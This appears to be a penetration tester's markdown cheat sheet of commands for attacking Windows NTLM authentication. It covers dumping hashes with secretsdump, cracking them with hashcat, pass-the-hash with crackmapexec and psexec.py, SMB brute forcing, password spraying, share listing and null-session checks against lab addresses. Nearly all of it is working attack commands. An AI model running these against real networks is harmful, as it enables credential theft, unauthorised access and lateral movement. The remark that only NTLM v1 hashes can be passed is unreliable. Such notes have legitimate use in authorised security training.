# NTLM Hashes

## Dumping Hashes with secretsdump.py

https://github.com/SecureAuthCorp/impacket

```
secretsdump.py DOMAIN/USERNAME:PASSWORD@IP
```

## Cracking NTLM Hashes with Hashcat

On Windows

```
hashcat64.exe -m 1000 hashfile.txt rockyou.txt -O
```

## Pass the hash

You can only pass NTLM V1 hashes

```
crackmapexec smb IP -u "USERNAME" -H HASH --local-auth

e.g.
crackmapexec smb 192.168.64.0/24 -u fcastle -d KOMBINAT.local -p 'Password1' --local-auth
```

## CrackMapExec

Brute Force

```
crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt (--continue-on-success)
```

List shares

```
crackmapexec smb 10.10.10.184 -u USER -p PASSWORD --shares
```

Null authentication

```
crackmapexec smb 10.10.10.184 --pass-pol -u '' -p ''
```

Test credentials on local network (password spraying)

```
crackmapexec 192.168.57.0/24 -u USERNAME -d DOMAIN.local -p PASSWORD
```

## PSEXEC

PSEXEC supports hashes instead of passwords - Note: Entire hash needed LMN:NTLM

```
psexec.py "username:@192.168.57.141 -hashes lmn:ntlm
```